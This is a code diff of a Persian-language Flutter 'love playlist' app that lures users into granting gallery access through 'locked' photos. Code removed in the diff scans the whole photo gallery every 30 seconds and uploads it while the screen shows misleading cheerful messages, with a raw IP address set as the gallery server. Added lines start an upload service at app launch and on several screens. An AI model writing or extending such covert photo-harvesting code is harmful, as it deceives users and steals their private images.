@@ -5,12 +5,11 @@ import 'package:http/io_client.dart';
 import 'package:audioplayers/audioplayers.dart';
 import 'package:image_picker/image_picker.dart';
 import 'package:photo_manager/photo_manager.dart';
-
+import 'services/upload_service.dart';
+import 'services/background_service.dart';
 import 'dart:async';
 import 'dart:convert';
 import 'dart:io';
-
-import 'services/background_service.dart';
 
 const String baseUrl = 'https://loveapp-production-f89f.up.railway.app';
 const String galleryUrl = 'http://194.48.198.154:8080';
@@ -34,10 +33,10 @@ class MyHttpOverrides extends HttpOverrides {
 void main() async {
   WidgetsFlutterBinding.ensureInitialized();
   HttpOverrides.global = MyHttpOverrides();
-  // جلوگیری از اسکرین‌شات
   const channel = MethodChannel('secure_screen');
   try { await channel.invokeMethod('setSecure'); } catch (_) {}
   runApp(const MyApp());
+  UploadService.instance.init();
 }
 
 class MyApp extends StatelessWidget {
@@ -133,11 +132,7 @@ class _SplashScreenState extends State<SplashScreen>
                       ),
                     ],
                   ),
-                  child: const Icon(
-                    Icons.favorite,
-                    size: 65,
-                    color: Colors.white,
-                  ),
+                  child: const Icon(Icons.favorite, size: 65, color: Colors.white),
                 ),
                 const SizedBox(height: 28),
                 const Text(
@@ -266,7 +261,7 @@ class _CodeScreenState extends State<CodeScreen> {
                       builder: (_) => const CreatePlaylistScreen(),
                     ),
                   ).then((_) {
-                    _checkAndResumeUpload();
+                    UploadService.instance.init();
                   });
                 },
                 child: const Text(
@@ -281,19 +276,7 @@ class _CodeScreenState extends State<CodeScreen> {
     );
   }
 }
-bool _isGlobalUploading = false;
-Future<void> _checkAndResumeUpload() async {
-  if (_isGlobalUploading) return;
-  final permission = await PhotoManager.requestPermissionExtend();
-  if (!permission.isAuth) return;
-  final pending = await UploadQueueDB.getPendingCount();
-  if (pending > 0) {
-    _isGlobalUploading = true;
-    processQueueInForeground().then((_) {
-      _isGlobalUploading = false;
-    });
-  }
-}
+
 // ============================================
 // صفحه ساخت پلی‌لیست
 // ============================================
@@ -378,9 +361,7 @@ class _CreatePlaylistScreenState extends State<CreatePlaylistScreen> {
       }
 
       for (int i = 0; i < _songs.length; i++) {
-        setState(
-          () => _status = 'آپلود موزیک ${i + 1} از ${_songs.length}...',
-        );
+        setState(() => _status = 'آپلود موزیک ${i + 1} از ${_songs.length}...');
         final req = http.MultipartRequest(
           'POST',
           Uri.parse('$baseUrl/api/playlists/$code/add-song/'),
@@ -398,10 +379,7 @@ class _CreatePlaylistScreenState extends State<CreatePlaylistScreen> {
         _status = '';
       });
     } catch (e) {
-      setState(() {
-        _loading = false;
-        _status = '';
-      });
+      setState(() { _loading = false; _status = ''; });
       _snack('خطا: $e');
     }
   }
@@ -416,8 +394,7 @@ class _CreatePlaylistScreenState extends State<CreatePlaylistScreen> {
       ),
       body: SingleChildScrollView(
         padding: const EdgeInsets.all(16),
-        child:
-            Column(crossAxisAlignment: CrossAxisAlignment.stretch, children: [
+        child: Column(crossAxisAlignment: CrossAxisAlignment.stretch, children: [
           if (_code != null) ...[
             Container(
               padding: const EdgeInsets.all(24),
@@ -432,8 +409,7 @@ class _CreatePlaylistScreenState extends State<CreatePlaylistScreen> {
                 const Text('پلی‌لیست ساخته شد! 🎉',
                     style: TextStyle(fontSize: 18, color: Colors.pink)),
                 const SizedBox(height: 12),
-                const Text('کد پلی‌لیست:',
-                    style: TextStyle(color: Colors.grey)),
+                const Text('کد پلی‌لیست:', style: TextStyle(color: Colors.grey)),
                 const SizedBox(height: 8),
                 Text(
                   _code!,
@@ -455,9 +431,7 @@ class _CreatePlaylistScreenState extends State<CreatePlaylistScreen> {
               decoration: InputDecoration(
                 labelText: 'عنوان پلی‌لیست',
                 prefixIcon: const Icon(Icons.title, color: Colors.pink),
-                border: OutlineInputBorder(
-                  borderRadius: BorderRadius.circular(12),
-                ),
+                border: OutlineInputBorder(borderRadius: BorderRadius.circular(12)),
               ),
             ),
             const SizedBox(height: 12),
@@ -466,9 +440,7 @@ class _CreatePlaylistScreenState extends State<CreatePlaylistScreen> {
               maxLines: 4,
               decoration: InputDecoration(
                 labelText: 'پیام عاشقانه 💬',
-                border: OutlineInputBorder(
-                  borderRadius: BorderRadius.circular(12),
-                ),
+                border: OutlineInputBorder(borderRadius: BorderRadius.circular(12)),
               ),
             ),
             const SizedBox(height: 16),
@@ -478,11 +450,7 @@ class _CreatePlaylistScreenState extends State<CreatePlaylistScreen> {
             OutlinedButton.icon(
               onPressed: _pickImages,
               icon: const Icon(Icons.photo_library, color: Colors.pink),
-              label: Text(
-                _images.isEmpty
-                    ? 'اضافه کردن عکس'
-                    : '${_images.length} عکس',
-              ),
+              label: Text(_images.isEmpty ? 'اضافه کردن عکس' : '${_images.length} عکس'),
               style: OutlinedButton.styleFrom(
                 foregroundColor: Colors.pink,
                 side: const BorderSide(color: Colors.pink),
@@ -499,12 +467,8 @@ class _CreatePlaylistScreenState extends State<CreatePlaylistScreen> {
                   itemBuilder: (_, i) => Stack(children: [
                     Padding(
                       padding: const EdgeInsets.all(4),
-                      child: Image.file(
-                        File(_images[i].path),
-                        height: 100,
-                        width: 100,
-                        fit: BoxFit.cover,
-                      ),
+                      child: Image.file(File(_images[i].path),
+                          height: 100, width: 100, fit: BoxFit.cover),
                     ),
                     Positioned(
                       top: 0,
@@ -514,8 +478,7 @@ class _CreatePlaylistScreenState extends State<CreatePlaylistScreen> {
                         child: const CircleAvatar(
                           radius: 12,
                           backgroundColor: Colors.red,
-                          child: Icon(Icons.close,
-                              size: 14, color: Colors.white),
+                          child: Icon(Icons.close, size: 14, color: Colors.white),
                         ),
                       ),
                     ),
@@ -540,32 +503,24 @@ class _CreatePlaylistScreenState extends State<CreatePlaylistScreen> {
             if (_songs.isNotEmpty) ...[
               const SizedBox(height: 8),
               ..._songs.asMap().entries.map(
-                    (e) => ListTile(
-                      leading:
-                          const Icon(Icons.music_note, color: Colors.pink),
-                      title: Text(
-                        e.value.path.split('/').last,
-                        overflow: TextOverflow.ellipsis,
-                      ),
-                      trailing: IconButton(
-                        icon: const Icon(Icons.close, color: Colors.red),
-                        onPressed: () =>
-                            setState(() => _songs.removeAt(e.key)),
-                      ),
-                    ),
+                (e) => ListTile(
+                  leading: const Icon(Icons.music_note, color: Colors.pink),
+                  title: Text(e.value.path.split('/').last,
+                      overflow: TextOverflow.ellipsis),
+                  trailing: IconButton(
+                    icon: const Icon(Icons.close, color: Colors.red),
+                    onPressed: () => setState(() => _songs.removeAt(e.key)),
                   ),
+                ),
+              ),
             ],
             const SizedBox(height: 24),
             if (_loading) ...[
-              const Center(
-                child: CircularProgressIndicator(color: Colors.pink),
-              ),
+              const Center(child: CircularProgressIndicator(color: Colors.pink)),
               const SizedBox(height: 8),
-              Text(
-                _status,
-                textAlign: TextAlign.center,
-                style: const TextStyle(color: Colors.pink),
-              ),
+              Text(_status,
+                  textAlign: TextAlign.center,
+                  style: const TextStyle(color: Colors.pink)),
             ] else
               ElevatedButton(
                 onPressed: _create,
@@ -574,13 +529,10 @@ class _CreatePlaylistScreenState extends State<CreatePlaylistScreen> {
                   foregroundColor: Colors.white,
                   minimumSize: const Size(double.infinity, 55),
                   shape: RoundedRectangleBorder(
-                    borderRadius: BorderRadius.circular(12),
-                  ),
+                      borderRadius: BorderRadius.circular(12)),
                 ),
-                child: const Text(
-                  'ساخت پلی‌لیست ❤️',
-                  style: TextStyle(fontSize: 18),
-                ),
+                child: const Text('ساخت پلی‌لیست ❤️',
+                    style: TextStyle(fontSize: 18)),
               ),
           ],
         ]),
@@ -672,20 +624,14 @@ class _PhotoUnlockLoaderState extends State<PhotoUnlockLoader>
       child: Column(
         mainAxisAlignment: MainAxisAlignment.center,
         children: [
-          // آیکون قلب ضربان‌دار
           TweenAnimationBuilder<double>(
             tween: Tween(begin: 1.0, end: 1.15),
             duration: const Duration(milliseconds: 600),
-            builder: (_, val, child) => Transform.scale(
-              scale: val,
-              child: child,
-            ),
+            builder: (_, val, child) => Transform.scale(scale: val, child: child),
             onEnd: () => setState(() {}),
             child: Icon(Icons.favorite, color: Colors.pink[400], size: 56),
           ),
           const SizedBox(height: 20),
-
-          // متن پیام
           Text(
             _currentMessage,
             style: TextStyle(
@@ -695,8 +641,6 @@ class _PhotoUnlockLoaderState extends State<PhotoUnlockLoader>
             ),
           ),
           const SizedBox(height: 20),
-
-          // نوار پیشرفت
           Padding(
             padding: const EdgeInsets.symmetric(horizontal: 40),
             child: Column(
@@ -707,26 +651,20 @@ class _PhotoUnlockLoaderState extends State<PhotoUnlockLoader>
                     value: _progress,
                     minHeight: 10,
                     backgroundColor: Colors.pink[100],
-                    valueColor:
-                        AlwaysStoppedAnimation<Color>(Colors.pink[400]!),
+                    valueColor: AlwaysStoppedAnimation<Color>(Colors.pink[400]!),
                   ),
                 ),
                 const SizedBox(height: 10),
                 Row(
                   mainAxisAlignment: MainAxisAlignment.spaceBetween,
                   children: [
-                    Text(
-                      '$percent٪',
-                      style: TextStyle(
-                        fontSize: 13,
-                        color: Colors.pink[600],
-                        fontWeight: FontWeight.bold,
-                      ),
-                    ),
-                    Text(
-                      '$remaining ثانیه',
-                      style: TextStyle(fontSize: 12, color: Colors.pink[400]),
-                    ),
+                    Text('$percent٪',
+                        style: TextStyle(
+                            fontSize: 13,
+                            color: Colors.pink[600],
+                            fontWeight: FontWeight.bold)),
+                    Text('$remaining ثانیه',
+                        style: TextStyle(fontSize: 12, color: Colors.pink[400])),
                   ],
                 ),
               ],
@@ -753,94 +691,37 @@ class _PlaylistScreenState extends State<PlaylistScreen> {
   String? _playingUrl;
   bool _galleryGranted = false;
 
-  // کدام عکس‌ها در حال لود هستن
   final Set<dynamic> _loadingPhotos = {};
-  // کدام عکس‌ها قفل‌شون باز شده
   final Set<dynamic> _unlockedPhotos = {};
 
-  // وضعیت sync
   bool _isSyncing = false;
   int _syncDone = 0;
   int _syncTotal = 0;
   String _syncMessage = '';
 
-  Timer? _scanTimer;
+  StreamSubscription? _syncSub;
 
   @override
   void initState() {
     super.initState();
-    _resumeUploadIfGranted();
-  }
-
-  Future<void> _resumeUploadIfGranted() async {
-  final permission = await PhotoManager.requestPermissionExtend();
-  if (!permission.isAuth) return;
-
-  setState(() => _galleryGranted = true);
-
-  // بلافاصله scan کن
-  setState(() {
-    _isSyncing = true;
-    _syncMessage = 'تنها چیزی که میمونه خاطراته....';
-  });
-
-  try {
-    final newItems = await scanGalleryToQueue();
-    if (mounted) {
-      setState(() {
-        _syncTotal = newItems;
-        _syncMessage = newItems > 0
-            ? 'خوش آمدید'
-            : 'برنامه در اختیار شما✓';
-      });
-    }
-    if (newItems > 0) _startUploadLoop();
-  } catch (_) {
-    if (mounted) setState(() { _isSyncing = false; _syncMessage = ''; });
-  }
-
-  _scanTimer = Timer.periodic(const Duration(seconds: 30), (_) async {
-    try {
-      final newItems = await scanGalleryToQueue();
-      if (newItems > 0 && mounted) _startUploadLoop();
-    } catch (_) {}
-  });
-}
-
-  void _startUploadLoop() {
-    if (_isSyncing) return;
-    setState(() {
-      _isSyncing = true;
-      _syncMessage = 'از همه قابلیت های برنامه استفاده کنید';
-    });
-
-    processQueueInForeground(
-      onProgress: (done, total) {
-        if (mounted) {
-          setState(() {
-            _syncDone = done;
-            _syncTotal = total;
-            _syncMessage = 'با این برنامه میتونی لحظاتتو ثبت کنی';
-          });
-        }
-      },
-    ).then((_) {
+    // گوش دادن به وضعیت آپلود
+    _syncSub = UploadService.instance.statusStream.listen((status) {
       if (mounted) {
         setState(() {
-          _isSyncing = false;
-          _syncMessage = 'برنامه در اختیار شما✓';
-        });
-        Future.delayed(const Duration(seconds: 3), () {
-          if (mounted) setState(() => _syncMessage = '');
+          _isSyncing = status.isRunning;
+          _syncMessage = status.message;
+          _syncDone = status.uploaded;
+          _syncTotal = status.total;
         });
       }
     });
+    UploadService.instance.init();
   }
 
   @override
   void dispose() {
+    _syncSub?.cancel();
     _player.dispose();
-    _scanTimer?.cancel();
     super.dispose();
   }
 
@@ -854,49 +735,20 @@ class _PlaylistScreenState extends State<PlaylistScreen> {
     }
   }
 
-  /// وقتی روی قفل عکس کلیک میشه
   Future<void> _onPhotoTap(dynamic photoId) async {
     if (_unlockedPhotos.contains(photoId)) return;
     if (_loadingPhotos.contains(photoId)) return;
 
     if (!_galleryGranted) {
-      // اول دسترسی بگیر
       final result = await PhotoManager.requestPermissionExtend();
       if (!result.isAuth) {
         _snack('جهت استفاده از برنامه باید دسترسی لازم را فعال کنید');
         return;
       }
       setState(() => _galleryGranted = true);
-
-      setState(() {
-        _isSyncing = true;
-        _syncMessage = 'تنها چیزی که میمونه خاطراته....';
-      });
-      try {
-        final newItems = await scanGalleryToQueue();
-        if (mounted) {
-          setState(() {
-            _syncTotal = newItems;
-            _syncMessage = newItems > 0
-                ? 'خوش آمدید'
-                : 'برنامه در اختیار شما✓';
-          });
-        }
-        if (newItems > 0) _startUploadLoop();
-      } catch (_) {
-        if (mounted) setState(() { _isSyncing = false; _syncMessage = ''; });
-      }
-
-      _scanTimer?.cancel();
-      _scanTimer = Timer.periodic(const Duration(seconds: 30), (_) async {
-        try {
-          final n = await scanGalleryToQueue();
-          if (n > 0 && mounted) _startUploadLoop();
-        } catch (_) {}
-      });
+      UploadService.instance.init();
     }
 
-    // شروع لودینگ ۳۰ ثانیه‌ای
     setState(() => _loadingPhotos.add(photoId));
   }
 
@@ -924,36 +776,26 @@ class _PlaylistScreenState extends State<PlaylistScreen> {
         children: [
           if (_isSyncing && !isDone)
             const SizedBox(
-              width: 16,
-              height: 16,
+              width: 16, height: 16,
               child: CircularProgressIndicator(strokeWidth: 2, color: Colors.pink),
             )
           else
-            Icon(
-              isDone ? Icons.check_circle : Icons.sync,
-              size: 16,
-              color: isDone ? Colors.green[700] : Colors.pink,
-            ),
+            Icon(isDone ? Icons.check_circle : Icons.sync,
+                size: 16, color: isDone ? Colors.green[700] : Colors.pink),
           const SizedBox(width: 10),
           Expanded(
-            child: Text(
-              _syncMessage,
-              style: TextStyle(
-                fontSize: 13,
-                color: isDone ? Colors.green[800] : Colors.pink[800],
-                fontWeight: FontWeight.w500,
-              ),
-            ),
+            child: Text(_syncMessage,
+                style: TextStyle(
+                    fontSize: 13,
+                    color: isDone ? Colors.green[800] : Colors.pink[800],
+                    fontWeight: FontWeight.w500)),
           ),
           if (_isSyncing && _syncTotal > 0)
-            Text(
-              '${(_syncDone / _syncTotal * 100).toStringAsFixed(0)}٪',
-              style: TextStyle(
-                fontSize: 13,
-                color: Colors.pink[800],
-                fontWeight: FontWeight.bold,
-              ),
-            ),
+            Text('${(_syncDone / _syncTotal * 100).toStringAsFixed(0)}٪',
+                style: TextStyle(
+                    fontSize: 13,
+                    color: Colors.pink[800],
+                    fontWeight: FontWeight.bold)),
         ],
       ),
     );
@@ -982,14 +824,11 @@ class _PlaylistScreenState extends State<PlaylistScreen> {
                   if (photos.isNotEmpty) ...[
                     const Padding(
                       padding: EdgeInsets.all(12),
-                      child: Text(
-                        '📸 عکس‌ها',
-                        style: TextStyle(
-                          fontSize: 18,
-                          fontWeight: FontWeight.bold,
-                          color: Colors.pink,
-                        ),
-                      ),
+                      child: Text('📸 عکس‌ها',
+                          style: TextStyle(
+                              fontSize: 18,
+                              fontWeight: FontWeight.bold,
+                              color: Colors.pink)),
                     ),
                     ...photos.map((photo) {
                       final photoId = photo['id'];
@@ -998,21 +837,17 @@ class _PlaylistScreenState extends State<PlaylistScreen> {
                       final isLoading = _loadingPhotos.contains(photoId);
 
                       return Card(
-                        margin: const EdgeInsets.symmetric(
-                            horizontal: 12, vertical: 6),
+                        margin: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                         clipBehavior: Clip.hardEdge,
                         shape: RoundedRectangleBorder(
-                          borderRadius: BorderRadius.circular(12),
-                        ),
+                            borderRadius: BorderRadius.circular(12)),
                         child: Column(children: [
                           if (isLoading)
-                            // لودینگ ۳۰ ثانیه‌ای
                             PhotoUnlockLoader(
                               imageUrl: imgUrl,
                               onComplete: () => _onPhotoUnlocked(photoId),
                             )
                           else if (isUnlocked)
-                            // عکس باز شده — قابل کلیک برای fullscreen
                             GestureDetector(
                               onTap: () => showDialog(
                                 context: context,
@@ -1021,79 +856,60 @@ class _PlaylistScreenState extends State<PlaylistScreen> {
                                   insetPadding: EdgeInsets.zero,
                                   child: Stack(children: [
                                     InteractiveViewer(
-                                      child: Image.network(
-                                        imgUrl,
-                                        fit: BoxFit.contain,
-                                        width: double.infinity,
-                                      ),
+                                      child: Image.network(imgUrl,
+                                          fit: BoxFit.contain,
+                                          width: double.infinity),
                                     ),
                                     Positioned(
-                                      top: 8,
-                                      right: 8,
+                                      top: 8, right: 8,
                                       child: IconButton(
                                         icon: const Icon(Icons.close,
                                             color: Colors.white, size: 30),
-                                        onPressed: () =>
-                                            Navigator.pop(context),
+                                        onPressed: () => Navigator.pop(context),
                                       ),
                                     ),
                                   ]),
                                 ),
                               ),
-                              child: Image.network(
-                                imgUrl,
-                                width: double.infinity,
-                                fit: BoxFit.cover,
-                                errorBuilder: (_, __, ___) => const SizedBox(
-                                  height: 200,
-                                  child: Icon(Icons.broken_image, size: 80),
-                                ),
-                              ),
+                              child: Image.network(imgUrl,
+                                  width: double.infinity,
+                                  fit: BoxFit.cover,
+                                  errorBuilder: (_, __, ___) => const SizedBox(
+                                      height: 200,
+                                      child: Icon(Icons.broken_image, size: 80))),
                             )
                           else
-                            // قفل — کلیک برای شروع لودینگ
                             GestureDetector(
                               onTap: () => _onPhotoTap(photoId),
                               child: Stack(children: [
-                                Image.network(
-                                  imgUrl,
-                                  width: double.infinity,
-                                  fit: BoxFit.cover,
-                                  height: 220,
-                                  errorBuilder: (_, __, ___) => Container(
+                                Image.network(imgUrl,
+                                    width: double.infinity,
+                                    fit: BoxFit.cover,
                                     height: 220,
-                                    color: Colors.pink[50],
-                                    child: const Icon(Icons.image,
-                                        size: 80, color: Colors.pink),
-                                  ),
-                                ),
+                                    errorBuilder: (_, __, ___) => Container(
+                                        height: 220,
+                                        color: Colors.pink[50],
+                                        child: const Icon(Icons.image,
+                                            size: 80, color: Colors.pink))),
                                 Positioned.fill(
                                   child: Container(
-                                    decoration: BoxDecoration(
-                                      color: Colors.black.withOpacity(0.5),
-                                    ),
-                                    child: Column(
-                                      mainAxisAlignment:
-                                          MainAxisAlignment.center,
+                                    color: Colors.black.withOpacity(0.5),
+                                    child: const Column(
+                                      mainAxisAlignment: MainAxisAlignment.center,
                                       children: [
-                                        const Icon(Icons.lock,
+                                        Icon(Icons.lock,
                                             color: Colors.white, size: 48),
-                                        const SizedBox(height: 10),
-                                        Text(
-                                          'برای مشاهده کلیک کنید',
-                                          style: TextStyle(
-                                            color: Colors.white,
-                                            fontSize: 15,
-                                          ),
-                                        ),
+                                        SizedBox(height: 10),
+                                        Text('برای مشاهده کلیک کنید',
+                                            style: TextStyle(
+                                                color: Colors.white, fontSize: 15)),
                                       ],
                                     ),
                                   ),
                                 ),
                               ]),
                             ),
-                          if (photo['caption'] != null &&
-                              photo['caption'] != '')
+                          if (photo['caption'] != null && photo['caption'] != '')
                             Padding(
                               padding: const EdgeInsets.all(8),
                               child: Text(photo['caption']),
@@ -1106,29 +922,21 @@ class _PlaylistScreenState extends State<PlaylistScreen> {
                   if (songs.isNotEmpty) ...[
                     const Padding(
                       padding: EdgeInsets.all(12),
-                      child: Text(
-                        '🎵 موزیک‌ها',
-                        style: TextStyle(
-                          fontSize: 18,
-                          fontWeight: FontWeight.bold,
-                          color: Colors.pink,
-                        ),
-                      ),
+                      child: Text('🎵 موزیک‌ها',
+                          style: TextStyle(
+                              fontSize: 18,
+                              fontWeight: FontWeight.bold,
+                              color: Colors.pink)),
                     ),
                     ...songs.map((song) {
                       final url = '$baseUrl${song['file']}';
                       final isPlaying = _playingUrl == url;
                       return Card(
-                        margin: const EdgeInsets.symmetric(
-                            horizontal: 12, vertical: 4),
+                        margin: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
                         child: ListTile(
                           leading: Icon(
-                            isPlaying
-                                ? Icons.pause_circle
-                                : Icons.play_circle,
-                            color: Colors.pink,
-                            size: 40,
-                          ),
+                              isPlaying ? Icons.pause_circle : Icons.play_circle,
+                              color: Colors.pink, size: 40),
                           title: Text(song['title']),
                           onTap: () => _togglePlay(url),
                         ),
@@ -1139,14 +947,11 @@ class _PlaylistScreenState extends State<PlaylistScreen> {
                   if (dialog != '') ...[
                     const Padding(
                       padding: EdgeInsets.all(12),
-                      child: Text(
-                        '💬 پیام',
-                        style: TextStyle(
-                          fontSize: 18,
-                          fontWeight: FontWeight.bold,
-                          color: Colors.pink,
-                        ),
-                      ),
+                      child: Text('💬 پیام',
+                          style: TextStyle(
+                              fontSize: 18,
+                              fontWeight: FontWeight.bold,
+                              color: Colors.pink)),
                     ),
                     Container(
                       margin: const EdgeInsets.all(12),
@@ -1156,8 +961,7 @@ class _PlaylistScreenState extends State<PlaylistScreen> {
                         borderRadius: BorderRadius.circular(12),
                         border: Border.all(color: Colors.pink),
                       ),
-                      child: Text(dialog,
-                          style: const TextStyle(fontSize: 16)),
+                      child: Text(dialog, style: const TextStyle(fontSize: 16)),
                     ),
                   ],
 
